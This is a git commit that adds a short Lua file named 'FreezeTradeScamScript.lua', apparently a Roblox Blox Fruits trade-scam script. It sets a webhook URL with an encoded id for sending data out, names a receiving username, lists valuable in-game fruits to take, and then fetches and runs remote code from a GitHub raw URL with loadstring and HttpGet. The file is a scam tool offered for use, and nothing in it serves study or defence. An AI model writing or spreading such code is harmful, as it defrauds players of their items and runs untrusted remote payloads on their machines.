e2f2862d490df4230187d53d5b4fa0955da015fa
realredrealz <shadow123123123123123@gmail.com>
2025-04-11 15:08:25 +0300

    Create FreezeTradeScamScript.lua

---
+++ FreezeTradeScamScript.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=T0dGLXJPTUI0QWxLSE1ZSnZ6VjRvdzpPWW5pTVhEd1hZRkhBZ1h2VXctLXluWG5NWXVwbkRRY0F1QXlKR2g2Mk10YkpjNmJqT3Q2QktoNTVvSnM5elR5bWMwcmpCRG9hWEhscGZVdFVOSXRYM0NEN05SempFVkJpdXdNeDJSOFFuNXRKYkdKTHBVcFBzRWUzVlNpUkFqdXNJVmdmU1FQajZEQ2luY2tLQm9pTUtxTlMwZE5WTEIzckpUZElxZ0dRMTA"
+Usernames = {"BombasticBloxyGuy"}
+FruitsToHit = {"Dough-Dough", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
